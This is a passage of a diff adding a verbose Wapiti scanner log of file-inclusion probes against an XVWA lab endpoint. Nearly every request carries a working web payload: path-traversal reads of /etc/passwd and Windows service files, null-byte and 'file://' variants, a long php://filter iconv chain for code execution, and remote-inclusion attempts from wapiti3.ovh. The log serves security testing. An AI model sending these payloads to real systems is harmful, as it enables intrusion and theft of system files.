+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:46.318 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:46.329 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:46.341 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:46.351 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:46.361 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:46.372 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:46.386 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:46.401 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:46.414 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 15:24:46.431 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 15:24:46.448 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 15:24:46.464 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 15:24:46.476 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 15:24:46.490 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 15:24:46.506 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:46.522 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:46.547 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:46.551 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&item=10
+2024-03-20 15:24:46.568 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&item=10
+2024-03-20 15:24:46.584 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:46.601 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:46.617 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%2Fetc%2Fservices&item=10
+2024-03-20 15:24:46.631 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:46.648 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&item=10
+2024-03-20 15:24:46.665 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&item=10
+2024-03-20 15:24:46.681 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&item=10
+2024-03-20 15:24:46.693 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:46.708 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:46.719 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&item=10
+2024-03-20 15:24:46.731 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&item=10
+2024-03-20 15:24:46.743 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&item=10
+2024-03-20 15:24:46.754 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:46.765 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:46.777 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:46.790 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:46.806 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&item=10
+2024-03-20 15:24:46.821 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&item=10
+2024-03-20 15:24:46.836 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:46.851 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:46.868 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:46.882 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:46.893 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:46.910 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:46.924 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&item=10
+2024-03-20 15:24:46.940 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:46.958 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:46.974 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:46.991 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:47.010 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&item=10
+2024-03-20 15:24:47.022 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&item=10
+2024-03-20 15:24:47.035 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:47.049 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:47.062 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:47.073 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:47.084 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:47.098 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:47.111 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:47.127 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:47.140 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:47.152 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&item=10
+2024-03-20 15:24:47.166 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&item=10
+2024-03-20 15:24:47.178 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&item=10
+2024-03-20 15:24:47.192 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:47.203 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:47.215 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:47.229 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&item=10
+2024-03-20 15:24:47.242 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:47.255 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:47.270 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=file%3A%2F%2F%2Fetc%2Fpasswd&item=10
+2024-03-20 15:24:47.283 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&item=10
+2024-03-20 15:24:47.293 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&item=10
